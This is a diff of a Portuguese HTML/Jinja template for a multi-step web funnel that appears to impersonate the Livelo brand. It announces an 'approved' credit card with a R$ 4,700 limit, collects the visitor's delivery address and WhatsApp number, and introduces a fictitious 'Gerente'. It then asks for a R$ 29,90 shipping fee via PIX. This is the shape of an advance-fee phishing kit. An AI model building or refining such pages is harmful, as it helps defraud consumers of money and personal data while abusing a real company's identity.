+<svg fill="none" height="24" style="transform: rotate(90deg);" viewbox="0 0 24 24" width="24"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.9)" stroke-linecap="round" stroke-width="2.5"></path><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.9)" stroke-linecap="round" stroke-width="2.5"></path><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.9)" stroke-linecap="round" stroke-width="2.5"></path></svg>
+</div>
+<div class="adv-chip"><svg fill="none" height="26" viewbox="0 0 40 30" width="38"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#B8960C" height="28" opacity="0.4" width="1.5" x="8" y="1"></rect><rect fill="#B8960C" height="28" opacity="0.4" width="1.5" x="30.5" y="1"></rect><rect fill="#B8960C" height="1.5" opacity="0.4" width="38" x="1" y="10"></rect><rect fill="#B8960C" height="1.5" opacity="0.4" width="38" x="1" y="18.5"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
+<div class="adv-card-number">4532 •••• •••• 8790</div>
+<div class="adv-card-bottom">
+<div>
+<div class="adv-card-label">NOME DO TITULAR</div>
+<div class="adv-card-value" id="style-card-name">SEU NOME</div>
+</div>
+<div>
+<div class="adv-card-label">VALIDADE</div>
+<div class="adv-card-value">12/28</div>
+</div>
+<svg fill="none" height="28" viewbox="0 0 52 32" width="44"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle><path d="M26 4.6A14 14 0 0 1 32 16 14 14 0 0 1 26 27.4 14 14 0 0 1 20 16 14 14 0 0 1 26 4.6z" fill="#FF5F00" opacity="0.85"></path></svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Active template badge -->
+<div class="tpl-active-label" id="tpl-active-label">✦ Clássico</div>
+<!-- Horizontal template thumbnails -->
+<div class="tpl-scroll-container">
+<div class="tpl-scroll">
+<button aria-label="Clássico" class="tpl-thumb tpl-thumb-active" data-template="classico" onclick="selectTemplate(this,'classico')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#E5147A,#9C0E57)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><path d="M-10 30 Q20 10 50 25 Q80 40 100 20" fill="none" opacity="0.2" stroke="white" stroke-width="10"></path><path d="M-10 45 Q20 25 50 40 Q80 55 100 35" fill="none" opacity="0.15" stroke="white" stroke-width="7"></path><circle cx="75" cy="10" fill="none" opacity="0.2" r="18" stroke="white" stroke-width="1.2"></circle></svg>
+<span class="tpl-thumb-name">Clássico</span>
+</div>
+</button>
+<button aria-label="Noir" class="tpl-thumb" data-template="noir" onclick="selectTemplate(this,'noir')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#1A1A2E,#0F3460)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="0" x2="80" y1="12" y2="12"></line><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="0" x2="80" y1="24" y2="24"></line><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="0" x2="80" y1="36" y2="36"></line><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="20" x2="20" y1="0" y2="48"></line><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="40" x2="40" y1="0" y2="48"></line><line opacity="0.5" stroke="#D4AF37" stroke-width="0.6" x1="60" x2="60" y1="0" y2="48"></line><rect fill="none" height="14" opacity="0.8" rx="2" stroke="#D4AF37" stroke-width="1.2" width="24" x="28" y="17"></rect></svg>
+<span class="tpl-thumb-name">Noir</span>
+</div>
+</button>
+<button aria-label="Oceano" class="tpl-thumb" data-template="oceano" onclick="selectTemplate(this,'oceano')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#0EA5E9,#0369A1)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><path d="M0 18 C10 6 20 28 30 18 S50 6 60 18 S75 6 85 18" fill="none" opacity="0.2" stroke="white" stroke-width="6"></path><path d="M0 32 C10 20 20 42 30 32 S50 20 60 32 S75 20 85 32" fill="none" opacity="0.15" stroke="white" stroke-width="5"></path><path d="M0 45 C10 33 20 55 30 45 S50 33 60 45 S75 33 85 45" fill="none" opacity="0.12" stroke="white" stroke-width="4"></path></svg>
+<span class="tpl-thumb-name">Oceano</span>
+</div>
+</button>
+<button aria-label="Esmeralda" class="tpl-thumb" data-template="esmeralda" onclick="selectTemplate(this,'esmeralda')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#059669,#064E3B)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><polygon fill="none" opacity="0.3" points="40,4 52,11 52,25 40,32 28,25 28,11" stroke="white" stroke-width="1.5"></polygon><polygon fill="none" opacity="0.2" points="65,8 74,13 74,23 65,28 56,23 56,13" stroke="white" stroke-width="1"></polygon><polygon fill="none" opacity="0.2" points="15,8 24,13 24,23 15,28 6,23 6,13" stroke="white" stroke-width="1"></polygon><polygon fill="none" opacity="0.18" points="40,22 48,27 48,37 40,42 32,37 32,27" stroke="white" stroke-width="1"></polygon></svg>
+<span class="tpl-thumb-name">Esmeralda</span>
+</div>
+</button>
+<button aria-label="Galáxia" class="tpl-thumb" data-template="galaxia" onclick="selectTemplate(this,'galaxia')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#7C3AED,#4C1D95)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><circle cx="12" cy="10" fill="white" opacity="0.8" r="2"></circle><circle cx="35" cy="6" fill="white" opacity="0.9" r="2.5"></circle><circle cx="58" cy="14" fill="white" opacity="0.7" r="2"></circle><circle cx="25" cy="28" fill="white" opacity="0.6" r="1.5"></circle><circle cx="50" cy="32" fill="white" opacity="0.8" r="2"></circle><circle cx="70" cy="22" fill="white" opacity="0.6" r="1.5"></circle><circle cx="10" cy="36" fill="white" opacity="0.7" r="2"></circle><circle cx="65" cy="40" fill="white" opacity="0.7" r="1.5"></circle><line opacity="0.5" stroke="white" stroke-width="0.6" x1="12" x2="35" y1="10" y2="6"></line><line opacity="0.5" stroke="white" stroke-width="0.6" x1="35" x2="58" y1="6" y2="14"></line><line opacity="0.4" stroke="white" stroke-width="0.6" x1="35" x2="25" y1="6" y2="28"></line><line opacity="0.4" stroke="white" stroke-width="0.6" x1="25" x2="50" y1="28" y2="32"></line><line opacity="0.4" stroke="white" stroke-width="0.6" x1="58" x2="70" y1="14" y2="22"></line><line opacity="0.4" stroke="white" stroke-width="0.6" x1="50" x2="65" y1="32" y2="40"></line><line opacity="0.4" stroke="white" stroke-width="0.6" x1="25" x2="10" y1="28" y2="36"></line></svg>
+<span class="tpl-thumb-name">Galáxia</span>
+</div>
+</button>
+<button aria-label="Aurora" class="tpl-thumb" data-template="aurora" onclick="selectTemplate(this,'aurora')">
+<div class="tpl-thumb-card" style="background:linear-gradient(135deg,#F59E0B,#EF4444)">
+<svg style="position:absolute;inset:0;width:100%;height:100%" viewbox="0 0 80 48"><line opacity="0.25" stroke="white" stroke-width="1.5" x1="80" x2="80" y1="48" y2="0"></line><line opacity="0.22" stroke="white" stroke-width="1.2" x1="80" x2="65" y1="48" y2="0"></line><line opacity="0.2" stroke="white" stroke-width="1" x1="80" x2="50" y1="48" y2="0"></line><line opacity="0.18" stroke="white" stroke-width="0.8" x1="80" x2="35" y1="48" y2="0"></line><line opacity="0.15" stroke="white" stroke-width="0.7" x1="80" x2="20" y1="48" y2="0"></line><line opacity="0.12" stroke="white" stroke-width="0.6" x1="80" x2="5" y1="48" y2="0"></line><line opacity="0.18" stroke="white" stroke-width="0.8" x1="80" x2="0" y1="48" y2="20"></line><circle cx="80" cy="48" fill="none" opacity="0.2" r="18" stroke="white" stroke-width="1.2"></circle><circle cx="80" cy="48" fill="none" opacity="0.12" r="36" stroke="white" stroke-width="0.8"></circle></svg>
+<span class="tpl-thumb-name">Aurora</span>
+</div>
+</button>
+</div>
+</div>
+<button class="btn-primary" onclick="submitCardStyle()" style="max-width:340px;margin-top:22px">Continuar →</button>
 
-    <!-- Active template badge -->
-    <div class="tpl-active-label" id="tpl-active-label">&#10022; Cl&aacute;ssico</div>
 
-    <!-- Horizontal template thumbnails -->
-    <div class="tpl-scroll-container">
-      <div class="tpl-scroll">
 
-        <button class="tpl-thumb tpl-thumb-active" data-template="classico" onclick="selectTemplate(this,'classico')" aria-label="Cl&aacute;ssico">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#E5147A,#9C0E57)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><path d="M-10 30 Q20 10 50 25 Q80 40 100 20" stroke="white" fill="none" stroke-width="10" opacity="0.2"/><path d="M-10 45 Q20 25 50 40 Q80 55 100 35" stroke="white" fill="none" stroke-width="7" opacity="0.15"/><circle cx="75" cy="10" r="18" stroke="white" fill="none" stroke-width="1.2" opacity="0.2"/></svg>
-            <span class="tpl-thumb-name">Cl&aacute;ssico</span>
-          </div>
-        </button>
-
-        <button class="tpl-thumb" data-template="noir" onclick="selectTemplate(this,'noir')" aria-label="Noir">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#1A1A2E,#0F3460)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><line x1="0" y1="12" x2="80" y2="12" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><line x1="0" y1="24" x2="80" y2="24" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><line x1="0" y1="36" x2="80" y2="36" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><line x1="20" y1="0" x2="20" y2="48" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><line x1="40" y1="0" x2="40" y2="48" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><line x1="60" y1="0" x2="60" y2="48" stroke="#D4AF37" stroke-width="0.6" opacity="0.5"/><rect x="28" y="17" width="24" height="14" rx="2" stroke="#D4AF37" fill="none" stroke-width="1.2" opacity="0.8"/></svg>
-            <span class="tpl-thumb-name">Noir</span>
-          </div>
-        </button>
-
-        <button class="tpl-thumb" data-template="oceano" onclick="selectTemplate(this,'oceano')" aria-label="Oceano">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#0EA5E9,#0369A1)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><path d="M0 18 C10 6 20 28 30 18 S50 6 60 18 S75 6 85 18" stroke="white" fill="none" stroke-width="6" opacity="0.2"/><path d="M0 32 C10 20 20 42 30 32 S50 20 60 32 S75 20 85 32" stroke="white" fill="none" stroke-width="5" opacity="0.15"/><path d="M0 45 C10 33 20 55 30 45 S50 33 60 45 S75 33 85 45" stroke="white" fill="none" stroke-width="4" opacity="0.12"/></svg>
-            <span class="tpl-thumb-name">Oceano</span>
-          </div>
-        </button>
-
-        <button class="tpl-thumb" data-template="esmeralda" onclick="selectTemplate(this,'esmeralda')" aria-label="Esmeralda">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#059669,#064E3B)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><polygon points="40,4 52,11 52,25 40,32 28,25 28,11" stroke="white" fill="none" stroke-width="1.5" opacity="0.3"/><polygon points="65,8 74,13 74,23 65,28 56,23 56,13" stroke="white" fill="none" stroke-width="1" opacity="0.2"/><polygon points="15,8 24,13 24,23 15,28 6,23 6,13" stroke="white" fill="none" stroke-width="1" opacity="0.2"/><polygon points="40,22 48,27 48,37 40,42 32,37 32,27" stroke="white" fill="none" stroke-width="1" opacity="0.18"/></svg>
-            <span class="tpl-thumb-name">Esmeralda</span>
-          </div>
-        </button>
-
-        <button class="tpl-thumb" data-template="galaxia" onclick="selectTemplate(this,'galaxia')" aria-label="Gal&aacute;xia">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#7C3AED,#4C1D95)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><circle cx="12" cy="10" r="2" fill="white" opacity="0.8"/><circle cx="35" cy="6" r="2.5" fill="white" opacity="0.9"/><circle cx="58" cy="14" r="2" fill="white" opacity="0.7"/><circle cx="25" cy="28" r="1.5" fill="white" opacity="0.6"/><circle cx="50" cy="32" r="2" fill="white" opacity="0.8"/><circle cx="70" cy="22" r="1.5" fill="white" opacity="0.6"/><circle cx="10" cy="36" r="2" fill="white" opacity="0.7"/><circle cx="65" cy="40" r="1.5" fill="white" opacity="0.7"/><line x1="12" y1="10" x2="35" y2="6" stroke="white" stroke-width="0.6" opacity="0.5"/><line x1="35" y1="6" x2="58" y2="14" stroke="white" stroke-width="0.6" opacity="0.5"/><line x1="35" y1="6" x2="25" y2="28" stroke="white" stroke-width="0.6" opacity="0.4"/><line x1="25" y1="28" x2="50" y2="32" stroke="white" stroke-width="0.6" opacity="0.4"/><line x1="58" y1="14" x2="70" y2="22" stroke="white" stroke-width="0.6" opacity="0.4"/><line x1="50" y1="32" x2="65" y2="40" stroke="white" stroke-width="0.6" opacity="0.4"/><line x1="25" y1="28" x2="10" y2="36" stroke="white" stroke-width="0.6" opacity="0.4"/></svg>
-            <span class="tpl-thumb-name">Gal&aacute;xia</span>
-          </div>
-        </button>
-
-        <button class="tpl-thumb" data-template="aurora" onclick="selectTemplate(this,'aurora')" aria-label="Aurora">
-          <div class="tpl-thumb-card" style="background:linear-gradient(135deg,#F59E0B,#EF4444)">
-            <svg viewBox="0 0 80 48" style="position:absolute;inset:0;width:100%;height:100%"><line x1="80" y1="48" x2="80" y2="0" stroke="white" stroke-width="1.5" opacity="0.25"/><line x1="80" y1="48" x2="65" y2="0" stroke="white" stroke-width="1.2" opacity="0.22"/><line x1="80" y1="48" x2="50" y2="0" stroke="white" stroke-width="1" opacity="0.2"/><line x1="80" y1="48" x2="35" y2="0" stroke="white" stroke-width="0.8" opacity="0.18"/><line x1="80" y1="48" x2="20" y2="0" stroke="white" stroke-width="0.7" opacity="0.15"/><line x1="80" y1="48" x2="5" y2="0" stroke="white" stroke-width="0.6" opacity="0.12"/><line x1="80" y1="48" x2="0" y2="20" stroke="white" stroke-width="0.8" opacity="0.18"/><circle cx="80" cy="48" r="18" stroke="white" fill="none" stroke-width="1.2" opacity="0.2"/><circle cx="80" cy="48" r="36" stroke="white" fill="none" stroke-width="0.8" opacity="0.12"/></svg>
-            <span class="tpl-thumb-name">Aurora</span>
-          </div>
-        </button>
-
-      </div>
-    </div>
-
-    <button class="btn-primary" onclick="submitCardStyle()" style="max-width:340px;margin-top:22px">Continuar &#8594;</button>
-
-    <footer class="funnel-footer">
-      <p>Livelo | CNPJ: 12.888.241/0001-06</p>
-      <p>Alameda Xingu, 512 &middot; Alphaville, Barueri, SP</p>
-      <p>&copy; 2025 &middot; Todos os direitos reservados</p>
-    </footer>
-  </div>
+</div>
 </div>
 
-<!-- ═══════ FRETE ═══════ -->
-<div id="screen-shipping" class="screen">
-  <div class="funnel-page">
-    <div class="funnel-logo">
-      <span style="color:#E5147A;font-size:1.4rem;line-height:1">&#9670;</span>
-      <span style="font-family:Inter,sans-serif;font-weight:800;font-size:1.35rem;color:#1A1A1A;letter-spacing:-0.02em"> livelo</span>
-    </div>
-    <div class="step-card funnel-card">
-      <h2 class="funnel-q">Escolha o m&eacute;todo de envio</h2>
-      <p style="font-size:0.88rem;color:var(--text-muted);text-align:center;margin:8px 0 20px;line-height:1.55">Agora basta escolher uma forma de envio do seu Cart&atilde;o de Cr&eacute;dito <strong style="color:var(--pink)">APROVADO</strong></p>
-      <div class="shipping-opt" id="ship-sedex" onclick="selectShipping('sedex',29.90)">
-        <div class="ship-icon">&#128230;</div>
-        <div class="ship-info">
-          <div class="ship-name">SEDEX</div>
-          <div class="ship-time">1 dia &uacute;til</div>
-        </div>
-        <div class="ship-price">R$ 29,90</div>
-      </div>
-      <div class="shipping-opt" id="ship-pac" onclick="selectShipping('pac',24.30)">
-        <div class="ship-icon">&#128236;</div>
-        <div class="ship-info">
-          <div class="ship-name">PAC</div>
-          <div class="ship-time">17-20 dias &uacute;teis</div>
-        </div>
-        <div class="ship-price">R$ 24,30</div>
-      </div>
-    </div>
-    <footer class="funnel-footer">
-      <p>Livelo | CNPJ: 12.888.241/0001-06</p>
-      <p>Alameda Xingu, 512 &middot; Alphaville, Barueri, SP</p>
-      <p>&copy; 2025 &middot; Todos os direitos reservados</p>
-    </footer>
-  </div>
+<!-- ═══════ LOCALIZAÇÃO / CEP ═══════ -->
+<div class="screen" id="screen-cep">
+<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
+
+<div class="step-card funnel-card" style="padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); background: #FFF;">
+<h2 class="step-title" style="font-size:1.4rem; font-weight:800; margin-bottom:6px; color:#1A1A1A; text-align:center;">Endereço de Entrega</h2>
+<p class="step-sub" style="font-size:0.85rem; color:#666; margin-bottom:24px; text-align:center;">Onde você deseja receber seu cartão</p>
+
+<div class="input-group" style="margin-bottom:16px;">
+<label for="input-cep" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">CEP</label>
+<input type="text" id="input-cep" class="input-field" placeholder="00000-000" maxlength="9" oninput="mascaraCepInteligente(this)" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none; transition: border-color 0.2s;">
 </div>
 
-<!-- ═══════ WHATSAPP ═══════ -->
-<div id="screen-whatsapp" class="screen">
-  <div class="step-container">
-    <div style="text-align:center;margin-bottom:24px">
-  {%- if sys_config and sys_config.get('system_logo_url') and 'livelo' not in sys_config.get('system_logo_url','') and 'default' not in sys_config.get('system_logo_url','') %}
-    <img src="{{ sys_config.get('system_logo_url') }}" style="height:40px" alt="Logo">
-  {%- else %}
-    <svg viewBox="0 0 130 38" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:40px;display:inline-block">
-      <path d="M8 5L3 19l5 14" stroke="#E5147A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-      <text x="18" y="27" font-family="Inter,sans-serif" font-weight="800" font-size="22" fill="#1A1A1A">livelo</text>
-    </svg>
-  {%- endif %}
+<div class="input-group" style="margin-bottom:16px;">
+<label for="input-rua" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Endereço</label>
+<input type="text" id="input-rua" class="input-field" placeholder="Ex: Rua das Flores" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none;">
 </div>
-    <div class="step-card">
-      <h2 class="step-title">Ótimo, quase lá!</h2>
-      <p class="step-sub">Conheça sua Gerente — ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas.</p>
-      <div class="manager-box">
-        <div class="manager-photo-wrap">
-          <img id="manager-photo-img" src="/static/images/manager_default.svg" alt="Gerente" class="manager-photo" onerror="this.src='/static/images/manager_default.svg'"/>
-          <div class="manager-online-dot"></div>
-        </div>
-        <div class="manager-label">Gerente</div>
-        <div class="manager-name" id="mgr-display-name">Juliana Benedito</div>
-        <div class="manager-badge" id="mgr-since-badge">
-          <svg viewBox="0 0 16 16" fill="none" width="13" height="13"><path d="M8 2l1.5 3L13 5.5l-2.5 2.5.6 3.5L8 10l-3.1 1.5.6-3.5L3 5.5 6.5 5z" fill="#E5147A"/></svg>
-          Melhor gerente 2023-2024
-        </div>
+
+<div style="display:flex; gap:12px; margin-bottom:16px;">
+<div class="input-group" style="flex:1;">
+<label for="input-numero" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Número</label>
+<input type="text" id="input-numero" class="input-field" placeholder="123" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none;">
+</div>
+<div class="input-group" style="flex:1;">
+<label for="input-complemento" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Complemento</label>
+<input type="text" id="input-complemento" class="input-field" placeholder="Apto, Sala..." style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none;">
+</div>
+</div>
+
+<div class="input-group" style="margin-bottom:16px;">
+<label for="input-bairro" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Bairro</label>
+<input type="text" id="input-bairro" class="input-field" placeholder="Centro" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none;">
+</div>
+
+<div style="display:flex; gap:12px; margin-bottom:24px;">
+<div class="input-group" style="flex:1;">
+<label for="input-cidade" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Cidade</label>
+<input type="text" id="input-cidade" class="input-field" placeholder="Sua Cidade" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none;">
+</div>
+<div class="input-group" style="flex:1;">
+<label for="input-estado" class="input-label" style="font-size:0.75rem; color:#333; font-weight:600; margin-bottom:6px; display:block;">Estado</label>
+<select id="input-estado" class="input-field" style="width:100%; border:1px solid #E5E5E5; border-radius:10px; padding:14px; font-size:0.95rem; outline:none; background:#FFF; appearance:none; cursor:pointer;">
+<option value="" disabled selected>Selecione</option>
+<option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option>
+<option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option>
+<option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option>
+<option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option>
+<option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option>
+<option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option>
+<option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option>
+<option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option>
+<option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+</select>
+</div>
+</div>
+
+<button class="btn-primary" id="btn-cep-continuar" onclick="submitCep()" style="width:100%; padding:16px; font-size:1rem; font-weight:700; border-radius:24px; display:flex; justify-content:center; align-items:center; gap:8px;">
+Continuar 
+<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+</button>
+
+<style>
+.input-field:focus { border-color: #E5147A !important; box-shadow: 0 0 0 3px rgba(229,20,122,0.1) !important; }
+</style>
+
+</div>
+
+</div>
+</div>
+
+<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->
+<div class="screen" id="screen-shipping-success">
+<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
+
+<div style="background:#D1FAE5;border:1px solid #10B981;border-radius:12px;padding:16px;display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:24px">
+<div style="width:24px;height:24px;border-radius:50%;background:#10B981;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:14px">✓</div>
+<span style="color:#065F46;font-weight:600;font-size:0.9rem">Taxa de envio gerada com sucesso!</span>
+</div>
+<div class="info-block" style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:20px;margin-bottom:16px">
+<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:12px">Detalhes do Envio</div>
+<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.5">
+        Endereço de entrega:<br/>
+<span id="display-rua" style="color:#1A1A1A"></span><br/>
+<span id="display-bairro" style="color:#1A1A1A"></span><br/>
+<span id="display-cep" style="color:#1A1A1A"></span>
+</div>
+</div>
+<div class="info-block" style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:20px;margin-bottom:24px">
+<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:12px">Método de Envio</div>
+<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.5">
+<span style="color:#1A1A1A;font-weight:600">SEDEX</span><br/>
+        Prazo de entrega: 3 dias úteis<br/>
+        Valor do frete: <strong style="color:var(--pink)">R$ 29,90</strong>
+</div>
+</div>
+<button class="btn-primary" onclick="goToStep('shipping-summary')" style="margin-top:0;margin-bottom:16px">SIM, VOU QUERER! →</button>
+<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:20px">
+<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
+<svg fill="none" height="20" viewbox="0 0 24 24" width="20"><rect height="14" rx="2" stroke="#E5147A" stroke-width="2" width="20" x="2" y="5"></rect><path d="M2 10h20" stroke="#E5147A" stroke-width="2"></path></svg>
+<span style="font-size:0.85rem;font-weight:700;color:var(--pink)">Cartão Virtual Disponível Hoje</span>
+</div>
+<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">
+        Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
       </div>
-      <div class="wa-input-wrap">
-        <svg viewBox="0 0 24 24" fill="none" width="20" height="20" style="flex-shrink:0"><path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.6 1.37 5.1L2 22l5.07-1.34A9.93 9.93 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="#25D366"/><path d="M16.5 14.5c-.3-.15-1.75-.86-2.02-.96s-.47-.15-.67.15-.77.96-.94 1.16-.35.22-.64.07a8.1 8.1 0 0 1-2.38-1.47 8.94 8.94 0 0 1-1.65-2.06c-.17-.3-.02-.46.13-.61.13-.13.3-.35.44-.52.15-.17.2-.3.3-.5.1-.2.05-.37-.02-.52s-.67-1.62-.92-2.22c-.24-.58-.49-.5-.67-.51-.17 0-.37-.02-.57-.02s-.52.07-.8.37c-.27.3-1.04 1.02-1.04 2.48s1.07 2.87 1.22 3.07c.14.2 2.1 3.2 5.08 4.49.71.3 1.26.48 1.69.62.71.22 1.36.19 1.87.12.57-.08 1.75-.72 2-1.41.24-.7.24-1.3.17-1.41-.07-.12-.27-.2-.57-.34z" fill="white"/></svg>
-        <input type="tel" id="input-whatsapp" class="wa-input" placeholder="Digite seu WhatsApp com DDD" inputmode="tel" maxlength="20"/>
+</div>
+
+
+</div>
+</div>
+<!-- ═══════ SHIPPING SUMMARY (Img 4) ═══════ -->
+<div class="screen" id="screen-shipping-summary">
+<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
+
+<div style="text-align:center;margin-bottom:24px">
+<div style="font-size:0.85rem;font-weight:600;color:var(--text)">Seu Limite Disponível</div>
+<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 4.700</div>
+</div>
+<div class="card-preview-sm" style="margin-bottom:24px;display:flex;justify-content:center">
+<!-- O JS vai injetar o background SVG aqui -->
+<div class="credit-card sm" id="summary-card-visual" style="background:linear-gradient(135deg,#059669,#064E3B)">
+<div class="card-face">
+<div class="card-row-top">
+<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain"/>
+</div>
+<div class="card-chip"><svg fill="none" height="22" viewbox="0 0 40 30" width="30"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
+<div class="card-row-number" style="margin:12px 0"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span>8790</span></div>
+<div class="card-row-bottom">
+<div><div class="card-label">NOME DO TITULAR</div><div class="card-value" id="summary-card-name" style="font-size:0.68rem">SEU NOME</div></div>
+<div><div class="card-label">VALIDADE</div><div class="card-value" style="font-size:0.68rem">12/28</div></div>
+<svg fill="none" height="24" viewbox="0 0 52 32" width="36"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle></svg>
+</div>
+</div>
+</div>
+</div>
+<div style="text-align:center;margin-bottom:20px">
+<h2 style="font-size:1.1rem;margin-bottom:8px;color:#1A1A1A">Finalize o envio do seu cartão</h2>
+<p style="font-size:0.8rem;color:var(--text-muted);margin:0">Confira os dados do cartão escolhido e o endereço de entrega antes de pagar o frete.</p>
+</div>
+<div style="text-align:center;margin-bottom:16px">
+<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 29,90</div>
+</div>
+<button class="btn-primary" onclick="goToStep('pix')" style="margin-top:0;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:8px">Pagar Frete <svg fill="none" height="18" viewbox="0 0 24 24" width="18"><path d="M9 18l6-6-6-6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></button>
+<div style="text-align:center;font-size:0.75rem;color:#10B981;margin-bottom:24px"><span style="display:inline-block;margin-right:4px">🔒</span> Pagamento 100% seguro</div>
+<div style="display:flex;gap:12px">
+<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
+<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Resumo do frete</div>
+<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4;text-transform:uppercase">
+<span style="color:#1A1A1A;font-weight:600">MÉTODO DE ENVIO</span><br/>SEDEX - Entrega expressa<br/><br/>
